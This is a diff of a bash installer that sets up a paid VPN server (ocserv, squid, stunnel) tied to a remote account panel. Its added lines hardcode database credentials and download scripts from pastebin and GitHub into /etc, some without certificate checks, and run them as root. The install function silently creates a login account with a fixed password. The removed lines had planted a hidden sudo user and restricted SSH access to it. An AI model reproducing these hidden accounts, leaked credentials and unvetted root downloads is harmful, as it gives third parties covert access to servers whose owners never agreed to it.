@@ -1,3 +1,12 @@
+#!/bin/bash
+#Script Variables
+HOST='66.29.146.72';
+USER='meteljep_paid';
+PASS='meteljep_paid';
+DBNAME='meteljep_paid';
+PORT_TCP='1194';
+PORT_UDP='53';
+DOMAIN='https://paid.bytesph.com';
 
 timedatectl set-timezone Asia/Riyadh
 install_require () {
@@ -157,7 +166,7 @@ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
 sudo apt update
 sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
-wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
+wget 'https://github.com/andresslacson1989/VPN-Scripts/raw/master/squid3' -O /etc/init.d/squid3
 dos2unix /etc/init.d/squid3
 sudo chmod +x /etc/init.d/squid3
 sudo update-rc.d squid3 defaults
@@ -195,7 +204,7 @@ echo '<!--KobeKobz--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
 chmod 755 *
 service squid3 restart
 cd /etc || exit
-wget 'https://pastebin.com/raw/z9j2nA8p' -O /etc/socks.py
+wget 'https://pastebin.com/raw/zNqrC5Zp' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 rm /etc/apt/sources.list
@@ -229,10 +238,12 @@ cd /etc/ocserv/
 #wget --no-check-certificate https://pastebin.com/raw/Gv8MP2NF -O fullchain.pem;wget --no-check-certificate https://pastebin.com/raw/NW4Vzbw9 -O privkey.pem
 openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=FirenetVPN/O=FirenetDev/C=PH' -keyout /etc/ocserv/ocserv.pem -out /etc/ocserv/ocserv.pem
 rm ocserv.conf
-wget --no-check-certificate -O go_connect firenetvpn.net/files/openconnect_files/go_connect.sh
-wget --no-check-certificate -O go_disconnect firenetvpn.net/files/openconnect_files/go_disconnect.sh
+wget --no-check-certificate -O go_connect https://github.com/andresslacson1989/VPN-Scripts/raw/master/go_connect.sh
+wget --no-check-certificate -O go_disconnect https://github.com/andresslacson1989/VPN-Scripts/raw/master/go_disconnect.sh
 chmod +x go_connect go_disconnect
 sed -i "s|LENZPOGI|$(curl -s https://api.ipify.org)|g" /etc/ocserv/go_connect
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/ocserv/go_connect
+sed -i "s|DOMAIN|$DOMAIN|g" /etc/ocserv/go_disconnect
 echo 'auth = "radius [config=/etc/radcli/radiusclient.conf]"
 tcp-port = '$PORT_TCP'
 udp-port = '$PORT_TCP'
@@ -347,11 +358,9 @@ RLIMITS=""' >> stunnel4
 
 install_sudo(){
 clear
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
+ {
+      useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null
+      service sshd restart
   }&>/dev/null
 }
 
